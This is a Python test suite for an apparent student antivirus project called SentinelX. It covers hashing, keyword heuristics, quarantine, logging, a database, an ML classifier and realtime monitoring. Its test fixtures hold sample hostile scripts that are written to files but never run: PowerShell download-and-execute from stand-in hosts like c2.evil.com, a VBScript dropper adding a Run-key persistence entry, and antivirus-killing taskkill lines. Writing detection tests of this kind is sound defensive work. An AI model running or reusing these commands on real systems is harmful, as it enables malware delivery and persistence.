"""
test_all.py — полный тест всех модулей SentinelX

Запуск:
    python test_all.py

Проверяет:
    1. Hash Checker    — SHA-256 хеш и детект известных угроз
    2. Heuristic       — эвристический анализ по ключевым словам
    3. Scanner         — сканирование папки, запись в БД, карантин
    4. Quarantine      — список, restore, delete
    5. Logger          — запись, чтение, поиск, очистка
    6. Database        — сохранение, счётчики, удаление
    7. AI Features     — извлечение 15 признаков
    8. AI Model        — предсказание MALWARE/SAFE с уверенностью
    9. Realtime        — автодетект нового файла в папке
"""

import os
import sys
import time
import shutil
import tempfile
import threading

# всегда запускаем из папки проекта
os.chdir(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.getcwd())

# ── цвета для вывода ────────────────────────────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

# ── счётчики ────────────────────────────────────────────────────────────────
passed = 0
failed = 0
total  = 0


def ok(msg):
    global passed, total
    passed += 1
    total  += 1
    print(f"  {GREEN}✓{RESET}  {msg}")


def fail(msg, reason=""):
    global failed, total
    failed += 1
    total  += 1
    detail = f" — {RED}{reason}{RESET}" if reason else ""
    print(f"  {RED}✗{RESET}  {msg}{detail}")


def section(title):
    print(f"\n{BOLD}{CYAN}{'─'*55}{RESET}")
    print(f"{BOLD}{CYAN}  {title}{RESET}")
    print(f"{BOLD}{CYAN}{'─'*55}{RESET}")


# ── вспомогательные функции ─────────────────────────────────────────────────

def make_file(suffix=".txt", content="safe content"):
    f = tempfile.NamedTemporaryFile(
        mode="w", suffix=suffix, delete=False, encoding="utf-8"
    )
    f.write(content)
    f.close()
    return f.name


def make_malware_file(suffix=".bat"):
    return make_file(
        suffix=suffix,
        content="@echo off\npowershell -enc ABC\nwget http://evil.com\nreg add HKLM\\run\ntaskkill /F /IM av.exe\n"
    )


def make_safe_file(suffix=".txt"):
    return make_file(
        suffix=suffix,
        content="Hello world\nThis is a totally normal document.\nNo suspicious content.\n"
    )


# ════════════════════════════════════════════════════════════════════════════
# 1. HASH CHECKER
# ════════════════════════════════════════════════════════════════════════════
section("1 · Hash Checker")

from core.hash_checker import calculate_sha256, is_malicious_hash

try:
    path = make_safe_file()
    h = calculate_sha256(path)
    os.unlink(path)
    if h and len(h) == 64:
        ok(f"SHA-256 calculated correctly ({h[:16]}…)")
    else:
        fail("SHA-256 result invalid", f"got: {h}")
except Exception as e:
    fail("SHA-256 calculation crashed", str(e))

try:
    path = make_safe_file()
    result = is_malicious_hash(path)
    os.unlink(path)
    if result is False:
        ok("Safe file correctly NOT in malicious hash list")
    else:
        fail("Safe file incorrectly flagged as malicious hash")
except Exception as e:
    fail("is_malicious_hash crashed", str(e))

try:
    # write a file whose hash we know is in MALICIOUS_HASHES
    from core.hash_checker import MALICIOUS_HASHES
    if MALICIOUS_HASHES:
        ok(f"MALICIOUS_HASHES loaded ({len(MALICIOUS_HASHES)} entries)")
    else:
        fail("MALICIOUS_HASHES is empty")
except Exception as e:
    fail("MALICIOUS_HASHES not accessible", str(e))


# ════════════════════════════════════════════════════════════════════════════
# 2. HEURISTIC ENGINE
# ════════════════════════════════════════════════════════════════════════════
section("2 · Heuristic Engine")

from core.heuristic_engine import heuristic_analysis

HEURISTIC_CASES = [
    # ext,   content,                                           expected,  описание
    (".bat",  "powershell wget curl reg add taskkill /F /IM av.exe", "HIGH",   "obvious malware .bat (5 keywords)"),
    (".vbs",  "CreateObject WScript.Shell objShell.Run hidden",      "MEDIUM", "VBScript dropper (ext+1 keyword = 50)"),
    (".ps1",  "Invoke-Expression DownloadString bypass -enc",        "MEDIUM", "PowerShell (ext+keywords = 50-70)"),
    (".txt",  "Hello world, this is a normal document.",             "LOW",    "plain text safe"),
    (".txt",  "",                                                     "LOW",    "empty file"),
    (".bat",  "@echo off\necho Hello\npause",                        "MEDIUM", "simple .bat — ext alone = 30 = MEDIUM"),
]

for ext, content, expected, label in HEURISTIC_CASES:
    try:
        path = make_file(suffix=ext, content=content)
        result = heuristic_analysis(path)
        os.unlink(path)
        if result == expected:
            ok(f"{label:<35} → {result}")
        else:
            fail(f"{label:<35} → expected {expected}, got {result}")
    except Exception as e:
        fail(f"{label} crashed", str(e))


# ════════════════════════════════════════════════════════════════════════════
# 3. SCANNER
# ════════════════════════════════════════════════════════════════════════════
section("3 · Scanner")

from core.database import initialize_database
from core.scanner import scan_directory, scan_file

# fresh DB and quarantine for tests
if os.path.exists("sentinelx.db"):
    os.remove("sentinelx.db")
if os.path.exists("quarantine"):
    shutil.rmtree("quarantine")
os.makedirs("quarantine", exist_ok=True)
initialize_database()

scan_dir = tempfile.mkdtemp()
try:
    # HIGH: много keywords → score ≥ 60
    mal1 = os.path.join(scan_dir, "threat1.bat")
    mal2 = os.path.join(scan_dir, "threat2.bat")
    safe = os.path.join(scan_dir, "readme.txt")

    with open(mal1, "w") as f:
        f.write("powershell wget curl reg add taskkill /F /IM av.exe\n")
    with open(mal2, "w") as f:
        f.write("powershell -hidden -enc ABC\nwget http://evil.com\ncurl -O backdoor\nreg add HKLM\\run\n")
    with open(safe, "w") as f:
        f.write("This is a normal readme file.\n")

    results = scan_directory(scan_dir)

    threats = [r for r in results if r["risk"] == "HIGH"]

    if len(threats) >= 2:
        ok(f"Detected {len(threats)} HIGH threats in folder")
    else:
        fail(f"Expected ≥ 2 HIGH threats, got {len(threats)}")

    non_threats = [r for r in results if r["risk"] != "HIGH"]
    if len(non_threats) == 0:
        ok("Safe file correctly not returned as threat")
    else:
        fail(f"Unexpected results: {non_threats}")

    from core.database import get_threat_count
    count = get_threat_count()
    if count >= 2:
        ok(f"Threats saved to database ({count} records)")
    else:
        fail(f"Expected ≥ 2 DB records, got {count}")

    from core.quarantine import list_quarantine_files
    q_files = list_quarantine_files()
    if len(q_files) >= 2:
        ok(f"Threats moved to quarantine ({len(q_files)} files)")
    else:
        fail(f"Expected ≥ 2 quarantine files, got {len(q_files)}")

except Exception as e:
    fail("Scanner crashed", str(e))
finally:
    shutil.rmtree(scan_dir, ignore_errors=True)

try:
    path = make_safe_file()
    result = scan_file(path)
    os.unlink(path)
    ok("scan_file() on safe file completed without crash")
except Exception as e:
    fail("scan_file() crashed on safe file", str(e))


# ════════════════════════════════════════════════════════════════════════════
# 4. QUARANTINE
# ════════════════════════════════════════════════════════════════════════════
section("4 · Quarantine")

# сбрасываем quarantine перед этим блоком
if os.path.exists("quarantine"):
    shutil.rmtree("quarantine")
os.makedirs("quarantine", exist_ok=True)

from core.quarantine import (
    move_to_quarantine, list_quarantine_files,
    restore_from_quarantine, delete_from_quarantine
)

try:
    # create a test file and quarantine it
    victim_dir = tempfile.mkdtemp()
    victim = os.path.join(victim_dir, "virus.bat")
    with open(victim, "w") as f:
        f.write("powershell malware\n")

    ok_move = move_to_quarantine(victim)
    if ok_move and not os.path.exists(victim):
        ok("move_to_quarantine() moved file successfully")
    else:
        fail("move_to_quarantine() failed")

    files = list_quarantine_files()
    names = [f["name"] for f in files]
    if "virus.bat" in names:
        ok(f"list_quarantine_files() returns quarantined file")
    else:
        fail("Quarantined file not found in list", f"got: {names}")

    ok_restore = restore_from_quarantine("virus.bat", target_dir=victim_dir)
    if ok_restore and os.path.exists(os.path.join(victim_dir, "virus.bat")):
        ok("restore_from_quarantine() returned file to original location")
    else:
        fail("restore_from_quarantine() failed")

    # quarantine again then delete
    move_to_quarantine(os.path.join(victim_dir, "virus.bat"))
    ok_del = delete_from_quarantine("virus.bat")
    if ok_del and not os.path.exists(os.path.join("quarantine", "virus.bat")):
        ok("delete_from_quarantine() permanently removed file")
    else:
        fail("delete_from_quarantine() failed")

    shutil.rmtree(victim_dir, ignore_errors=True)

except Exception as e:
    fail("Quarantine module crashed", str(e))


# ════════════════════════════════════════════════════════════════════════════
# 5. LOGGER
# ════════════════════════════════════════════════════════════════════════════
section("5 · Logger")

from core.logger import log_event, read_events, clear_events

try:
    clear_events()
    log_event("Test event alpha")
    log_event("Test event beta")
    log_event("Threat detected: virus.bat")

    events = read_events()
    if len(events) >= 3:
        ok(f"log_event() + read_events() working ({len(events)} events)")
    else:
        fail(f"Expected ≥ 3 events, got {len(events)}")

    threat_events = [e for e in events if "threat" in e.lower()]
    if threat_events:
        ok("Threat event found in log")
    else:
        fail("Threat event not found in log")

    clear_events()
    events_after = read_events()
    # after clear, only the "Log cleared" entry remains
    if len(events_after) <= 1:
        ok("clear_events() cleared the log")
    else:
        fail(f"clear_events() didn't clear — {len(events_after)} events remain")

except Exception as e:
    fail("Logger crashed", str(e))


# ════════════════════════════════════════════════════════════════════════════
# 6. DATABASE
# ════════════════════════════════════════════════════════════════════════════
section("6 · Database")

from core.database import (
    save_threat, get_threat_count,
    get_threat_counts_by_risk, delete_threat_by_file
)

try:
    if os.path.exists("sentinelx.db"):
        os.remove("sentinelx.db")
    initialize_database()

    save_threat("C:/test/virus1.bat", "HIGH")
    save_threat("C:/test/virus2.vbs", "HIGH")
    save_threat("C:/test/suspect.ps1", "MEDIUM")
    save_threat("C:/test/lowrisk.txt", "LOW")

    count = get_threat_count()
    if count == 4:
        ok(f"save_threat() + get_threat_count() → {count} records")
    else:
        fail(f"Expected 4 records, got {count}")

    by_risk = get_threat_counts_by_risk()
    if by_risk.get("HIGH") == 2 and by_risk.get("MEDIUM") == 1:
        ok(f"get_threat_counts_by_risk() → HIGH={by_risk['HIGH']} MEDIUM={by_risk['MEDIUM']} LOW={by_risk['LOW']}")
    else:
        fail(f"Risk counts wrong: {by_risk}")

    delete_threat_by_file("C:/test/virus1.bat")
    if get_threat_count() == 3:
        ok("delete_threat_by_file() removed 1 record")
    else:
        fail(f"Expected 3 after delete, got {get_threat_count()}")

except Exception as e:
    fail("Database module crashed", str(e))


# ════════════════════════════════════════════════════════════════════════════
# 7. AI — FEATURE EXTRACTION
# ════════════════════════════════════════════════════════════════════════════
section("7 · AI — Feature Extraction")

from ai.features import extract_features, FEATURE_NAMES

try:
    path = make_malware_file()
    features = extract_features(path)
    os.unlink(path)

    if features and len(features) == len(FEATURE_NAMES):
        ok(f"extract_features() returns {len(features)} features")
    else:
        fail(f"Expected {len(FEATURE_NAMES)} features, got {len(features) if features else None}")

    feat_dict = dict(zip(FEATURE_NAMES, features))
    if feat_dict["keyword_count"] >= 3:
        ok(f"keyword_count correctly high for malware ({feat_dict['keyword_count']:.0f})")
    else:
        fail(f"keyword_count too low: {feat_dict['keyword_count']}")

    if feat_dict["suspicious_ext"] == 1.0:
        ok("suspicious_ext = 1.0 for .bat file")
    else:
        fail(f"suspicious_ext should be 1.0, got {feat_dict['suspicious_ext']}")

    if feat_dict["url_count"] >= 1:
        ok(f"url_count detected ({feat_dict['url_count']:.0f} URLs)")
    else:
        fail("url_count should be ≥ 1")

except Exception as e:
    fail("Feature extraction crashed", str(e))

try:
    path = make_safe_file()
    features = extract_features(path)
    os.unlink(path)
    feat_dict = dict(zip(FEATURE_NAMES, features))

    if feat_dict["keyword_count"] == 0:
        ok("keyword_count = 0 for safe file")
    else:
        fail(f"Safe file has keyword_count = {feat_dict['keyword_count']}")

    if feat_dict["suspicious_ext"] == 0.0:
        ok("suspicious_ext = 0.0 for .txt file")
    else:
        fail(f"suspicious_ext should be 0.0, got {feat_dict['suspicious_ext']}")

except Exception as e:
    fail("Feature extraction crashed on safe file", str(e))

try:
    # nonexistent file
    result = extract_features("/nonexistent/path/file.bat")
    if result is None:
        ok("extract_features() returns None for missing file")
    else:
        fail("Should return None for missing file")
except Exception as e:
    fail("extract_features() crashed on missing file", str(e))


# ════════════════════════════════════════════════════════════════════════════
# 8. AI — MODEL PREDICTIONS
# ════════════════════════════════════════════════════════════════════════════
section("8 · AI Model — Predictions")

from ai.model import predict_file, is_model_ready

try:
    if is_model_ready():
        ok("Model files (model.pkl + scaler.pkl) found")
    else:
        fail("Model files not found — run python -m ai.trainer first")
except Exception as e:
    fail("is_model_ready() crashed", str(e))

AI_CASES = [
    # (suffix, content, expected_label, description)
    (".bat",
     "@echo off\npowershell -enc ABC\nwget http://evil.com\nreg add HKLM\\run\ntaskkill /F /IM av.exe\n",
     "MALWARE", "obvious malware .bat"),

    (".ps1",
     "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://c2.evil.com/payload')\n"
     "$payload = 'cG93ZXJzaGVsbCAtaGlkZGVuIC1jb21tYW5kIHdnZXQgaHR0cDovL2V2aWwuY29tL3BheWxvYWQ='\n"
     "[System.Convert]::FromBase64String($payload) | iex\n",
     "MALWARE", "PowerShell with base64 payload"),

    (".vbs",
     "Set objShell = CreateObject(\"WScript.Shell\")\n"
     "objShell.Run \"powershell -hidden -command wget http://c2.net/backdoor\"\n"
     "objShell.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\evil\", \"malware.vbs\"\n",
     "MALWARE", "VBScript dropper"),

    (".txt",
     "Hello world\nThis is a completely normal text file.\nNo suspicious content here at all.\n",
     "SAFE", "plain text document"),

    (".txt",
     "",
     "SAFE", "empty file"),

    (".log",
     "\n".join(f"[2024-01-{i:02d}] INFO Server OK status=200 user=admin" for i in range(1, 50)),
     "SAFE", "server log file"),

    (".cfg",
     "[database]\nhost=localhost\nport=5432\nname=mydb\nuser=admin\npassword=secret123\n",
     "SAFE", "config file"),
]

ai_correct = 0
for suffix, content, expected, label in AI_CASES:
    try:
        path = make_file(suffix=suffix, content=content)
        result = predict_file(path)
        os.unlink(path)

        if result is None:
            fail(f"{label:<40} → predict_file() returned None")
            continue

        got  = result["label"]
        conf = result["confidence"]
        risk = result["risk"]

        if got == expected:
            ai_correct += 1
            ok(f"{label:<40} → {got} ({conf:.0%}) risk={risk}")
        else:
            fail(f"{label:<40} → expected {expected}, got {got} ({conf:.0%})")

    except Exception as e:
        fail(f"{label} crashed", str(e))

accuracy = ai_correct / len(AI_CASES) * 100
print(f"\n  {BOLD}AI accuracy on test cases: {ai_correct}/{len(AI_CASES)} = {accuracy:.0f}%{RESET}")


# ════════════════════════════════════════════════════════════════════════════
# 9. REALTIME PROTECTION
# ════════════════════════════════════════════════════════════════════════════
section("9 · Realtime Protection")

from core.realtime_protection import RealtimeHandler
from watchdog.observers import Observer

if os.path.exists("sentinelx.db"):
    os.remove("sentinelx.db")
if os.path.exists("quarantine"):
    shutil.rmtree("quarantine")
os.makedirs("quarantine", exist_ok=True)
initialize_database()

watch_dir = tempfile.mkdtemp()

try:
    handler  = RealtimeHandler()
    observer = Observer()
    observer.schedule(handler, watch_dir, recursive=True)
    observer.start()

    if observer.is_alive():
        ok("Observer started and running")
    else:
        fail("Observer failed to start")

    time.sleep(0.5)

    # drop a malicious file
    threat_path = os.path.join(watch_dir, "realtime_test.bat")
    with open(threat_path, "w") as f:
        f.write("powershell wget curl reg add taskkill /F /IM av.exe\n")

    # wait for realtime to process it (up to 5 sec)
    deadline = time.time() + 5
    detected = False
    while time.time() < deadline:
        time.sleep(0.3)
        from core.database import get_threat_count
        if get_threat_count() >= 1:
            detected = True
            break

    if detected:
        ok("Malicious file detected by realtime protection")
    else:
        fail("Realtime protection did NOT catch the file within 5 seconds")

    q_files = list_quarantine_files()
    if any("realtime_test" in f["name"] for f in q_files) or not os.path.exists(threat_path):
        ok("File confirmed moved to quarantine")
    else:
        fail("File not found in quarantine after realtime detection")

    from core.database import get_threat_count
    if get_threat_count() >= 1:
        ok("Threat recorded in database by realtime protection")
    else:
        fail("No DB record created by realtime protection")

    # drop a safe file — should NOT go to quarantine
    safe_path = os.path.join(watch_dir, "safe_realtime.txt")
    with open(safe_path, "w") as f:
        f.write("Completely harmless file.\n")

    time.sleep(2.5)
    if os.path.exists(safe_path):
        ok("Safe file correctly left untouched by realtime protection")
        os.unlink(safe_path)
    else:
        fail("Safe file incorrectly moved to quarantine (false positive!)")

    observer.stop()
    observer.join(timeout=3)

    if not observer.is_alive():
        ok("Observer stopped cleanly")
    else:
        fail("Observer failed to stop")

except Exception as e:
    fail("Realtime protection crashed", str(e))
    try:
        observer.stop()
    except Exception:
        pass
finally:
    shutil.rmtree(watch_dir, ignore_errors=True)


# ════════════════════════════════════════════════════════════════════════════
# ИТОГОВЫЙ ОТЧЁТ
# ════════════════════════════════════════════════════════════════════════════
print(f"\n{BOLD}{'═'*55}{RESET}")
print(f"{BOLD}  РЕЗУЛЬТАТЫ{RESET}")
print(f"{BOLD}{'═'*55}{RESET}")
print(f"  {GREEN}Пройдено:  {passed}{RESET}")
print(f"  {RED}Провалено: {failed}{RESET}")
print(f"  Всего:     {total}")

pct = passed / total * 100 if total else 0
bar_len = 40
filled  = int(bar_len * passed / total) if total else 0
bar = f"{GREEN}{'█' * filled}{RESET}{'░' * (bar_len - filled)}"
print(f"\n  [{bar}] {pct:.0f}%")

if failed == 0:
    print(f"\n  {GREEN}{BOLD}✓ Все тесты пройдены — проект готов к защите!{RESET}")
elif failed <= 2:
    print(f"\n  {YELLOW}{BOLD}⚠ Почти всё работает, исправь {failed} тест(а){RESET}")
else:
    print(f"\n  {RED}{BOLD}✗ {failed} тестов провалено — нужна проверка{RESET}")

print()
